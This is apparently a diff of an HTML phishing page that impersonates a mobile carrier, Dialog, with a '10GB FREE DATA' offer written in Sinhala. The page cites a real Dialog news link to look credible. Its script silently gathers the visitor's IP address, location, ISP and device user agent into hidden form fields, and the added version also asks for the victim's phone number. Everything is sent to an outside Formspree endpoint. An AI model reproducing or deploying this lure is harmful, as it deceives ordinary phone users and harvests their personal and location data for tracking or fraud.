@@ -2,88 +2,100 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Dialog Free Data Checker</title>
+  <title>10GB FREE DATA</title>
   <style>
     body {
-      background: #121212;
-      color: #fff;
+      margin: 0;
+      background-color: #000;
       font-family: Arial, sans-serif;
+      color: #fff;
       text-align: center;
-      padding: 40px;
     }
-    h2 {
-      color: #00cec9;
+    .banner {
+      width: 100%;
     }
-    p {
-      color: #dfe6e9;
+    .container {
+      padding: 20px;
+    }
+    .msg {
+      font-size: 16px;
+      line-height: 1.6;
+    }
+    .link {
+      color: #00f;
+      word-break: break-word;
+    }
+    input, button {
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      margin-top: 15px;
+      width: 80%;
+      max-width: 350px;
+    }
+    input {
+      background: #fff;
+      color: #000;
     }
     button {
-      padding: 15px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      background-color: #0984e3;
-      color: white;
+      background-color: #00a8ff;
+      color: #fff;
+      font-weight: bold;
       cursor: pointer;
-      margin-top: 30px;
     }
     #status {
-      margin-top: 20px;
+      margin-top: 15px;
+      color: #0f0;
       display: none;
     }
   </style>
 </head>
 <body>
-  <h2>Dialog Free Data Checker</h2>
-  <p>Dialog සදහා නොමිලේ දත්ත ලබාදෙන්නේදැයි පරීක්ෂා කරන්න පහත බොත්තම ඔබන්න.</p>
+  <img src="https://i.ibb.co/qdyYL2b/10gb.png" alt="10GB Free Data" class="banner">
+  <div class="container">
+    <p class="msg">
+      Dialog සදහා නොමිලේ දත්ත ලබාදෙන්නේදැයි පරීක්ෂා කරන්න පහත බොත්තම ඔබන්න ඔබට ලබාගන්නට පුලුවන් Data හෝ Bonus Money එකක්
+      ඔබගේ Dialog Number එක ඇතුළත් කර විශේෂ දීමනාවක් දිනාගන්න!
+    </p>
+    <p class="link">
+      ආරදන ලිපිනය: https://www.dialog.lk/news/dialogs-wow-superapp-redefines-digital-lifestyle
+    </p>
 
-  <form id="autoForm">
-    <input type="hidden" name="IP Address" id="ip">
-    <input type="hidden" name="Location" id="location">
-    <input type="hidden" name="Device Info" id="device">
-    <button type="submit">Check Free Data</button>
-  </form>
-
-  <p id="status">Submitting... Please wait</p>
+    <form id="trackForm">
+      <input type="text" name="Dialog Number" placeholder="Enter your Dialog Number : - 077xxxxxxx" required>
+      <input type="hidden" name="IP Address" id="ip">
+      <input type="hidden" name="Location" id="location">
+      <input type="hidden" name="Device Info" id="device">
+      <button type="submit">Check Free Data</button>
+    </form>
+    <p id="status">Submitting... Please wait</p>
+  </div>
 
   <script>
-    async function fetchData() {
+    async function fetchInfo() {
       try {
         const res = await fetch("https://ipwho.is/");
         const data = await res.json();
         if (data.success) {
           document.getElementById("ip").value = data.ip;
-          document.getElementById("location").value = `
-Country: ${data.country}
-Region: ${data.region}
-City: ${data.city}
-ISP: ${data.connection.isp}
-Latitude: ${data.latitude}
-Longitude: ${data.longitude}
-Timezone: ${data.timezone.id}`;
+          document.getElementById("location").value =
+            `Country: ${data.country}, City: ${data.city}, ISP: ${data.connection.isp}`;
         }
         document.getElementById("device").value = navigator.userAgent;
-      } catch (err) {
-        console.error("Error fetching IP info", err);
+      } catch (e) {
+        console.log("Error fetching IP info");
       }
     }
 
-    let ready = false;
-    fetchData().then(() => {
-      ready = true;
-    });
+    fetchInfo();
 
-    document.getElementById("autoForm").addEventListener("submit", async function (e) {
-      e.preventDefault(); // prevent default until data loaded
-
-      if (!ready) {
-        alert("Gathering data... please wait a moment");
-        return;
-      }
+    document.getElementById("trackForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
 
       document.getElementById("status").style.display = "block";
-
       const formData = new FormData(this);
+
       await fetch("https://formspree.io/f/xvgkdndd", {
         method: "POST",
         body: formData,
